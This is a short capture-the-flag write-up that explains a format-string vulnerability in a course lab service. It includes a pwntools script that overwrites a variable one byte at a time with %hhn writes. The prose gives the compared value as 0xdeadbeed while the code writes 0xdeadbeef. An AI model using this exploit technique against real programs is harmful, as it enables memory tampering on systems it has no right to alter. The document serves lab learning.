# Challenge `Write Big Numbers` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23196
- Impact:
  - Allows user to alter local variable

## Steps to reproduce

1. Using `gdb` we can verify that `target` is stored in memory address `0x804c044`
2. This value is compared to `0xdeadbeed`
3. Since only one byte can be written at once, we need to write each byte individually, adjust de offset accordingly

The code used was the following:

```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23196, timeout=100)

target = 0x804c044

offset1 = (0xde - 16) % 256
offset2 = (0xad - 0xde) % 256
offset3 = (0xbe - 0xad) % 256
offset4 = (0xef - 0xbe) % 256

payload = p32(target + 3) + p32(target + 2) + p32(target + 1) + p32(target) + \
    "%{}x%7$hhn%{}x%8$hhn%{}x%9$hhn%{}x%10$hhn".format(offset1, offset2, offset3, offset4).encode()

s.sendline(payload)
print(s.recvall())

```